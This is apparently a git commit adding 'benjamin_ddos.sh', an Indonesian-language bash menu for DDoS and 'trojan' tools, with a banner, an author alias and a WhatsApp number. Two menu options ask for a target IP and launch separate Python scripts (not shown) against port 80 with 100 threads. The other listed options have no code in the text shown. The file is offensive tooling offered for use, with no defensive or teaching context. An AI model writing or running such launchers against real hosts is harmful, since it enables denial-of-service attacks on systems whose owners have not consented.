9c7c7cde08bb6481db69da5614946e3d9f5332ad
Benjamin12361 <55185625+Benjamin12361@users.noreply.github.com>
2019-09-29 17:19:38 +0700

    Add files via upload

---
+++ benjamin_ddos.sh
@@ -0,0 +1,54 @@
+
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS TAMFAN TROJAN " |lolcat
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :•MRX•BENJAMIN "
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS •MRX•BENJAMIN "
+echo $red"---------------------------------------"
+echo $green"?Contact :privasi         "
+echo $green"?WhatsApp:+6289637888353              "
+echo $green"?Message :Jangan Di Record Ya Tod      "
+echo $red"---------------------------------------"
+echo $yellow"                 OM BOOL OM"
+echo $red"---------------------------------------"
+echo $white"[1].BENJAMIN TROJAN"
+echo $white"[2].BENJAMIN DROID"
+echo $white"[3].BENJAMIN DDOS"
+echo $white"[4].BENJAMIN HAMMER"
+echo $white"[5].BENJAMIN VIRUS"
+echo $white"[0].EXIT"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " •MRX•BENJAMIN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " TAMFAN DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
+
